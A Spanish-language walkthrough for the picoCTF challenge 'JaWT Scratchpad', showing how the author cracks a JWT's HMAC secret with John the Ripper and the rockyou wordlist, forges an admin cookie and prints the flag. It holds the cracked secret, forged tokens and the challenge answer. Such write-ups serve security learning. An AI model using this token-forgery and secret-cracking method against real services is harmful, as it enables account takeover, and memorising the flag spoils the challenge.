## Nombre del reto:
JaWT Scratchpad

## Objetivo:
Check the admin scratchpad! https://jupiter.challenges.picoctf.org/problem/58210/ or http://jupiter.challenges.picoctf.org:58210

## Solución: 
Primeramente intentamos logearnos como admin pero nos aparece un error
YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT. 

Tomamos la cookie que se genera cuando nos logeamos con cualquier otro usuario
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYSJ9.Wpx3_bxlH3-Q8LDfbdaCP3ML7bAdosK4mAHRXhDmhug

La desincriptamos en jawt poniendo como usuario a admin
{
  "user": "admin"
}
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.-vh-85mhRjMzTUsaJEWhgJwu-_EzDOy8zI0a9dik2Ww

cambiamos la cookie pero aun con eso nos sale error

Internal Server Error
The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.


```┌──(kali㉿kali)-[~]
└─$ nano hash
                                                                             
```
```┌──(kali㉿kali)-[~]
└─$ cat hash                  
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYSJ9.Wpx3_bxlH3-Q8LDfbdaCP3ML7bAdosK4mAHRXhDmhug
                                                                             
```` 
```┌──(kali㉿kali)-[~]
└─$ nano hash
                                                                             
```
```┌──(kali㉿kali)-[~]
└─$ cat hash 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxmcmVkbyJ9.0DyU50Ow1jjs3OtrXPPrRi6V9fbX5y5qZd09DELRXZU
                                                                             
```
```┌──(kali㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 
[sudo] password for kali: 
^[[A^[[A^[[B^[[B^[[B^[[B^[[A^C
                                                                             
```
```┌──(kali㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
                                                                             
```
```┌──(kali㉿kali)-[~]
└─$ head /usr/share/wordlists/rockyou.txt
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
                                                                             
````
```┌──(kali㉿kali)-[~]```
└─$ john hash -w=/usr/share/wordlists/rockyou.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:42 DONE (2022-10-11 12:33) 0.02340g/s 173071p/s 173071c/s 173071C/s iloverob4live345..ilovepatri
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

Editamos la cookie en el cookie editor, actualizamos la pagina y ahora si la bandera nos aparece 
*cookie:**
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s

==picoCTF{jawt_was_just_what_you_thought_44c752f5}==

## Referencias: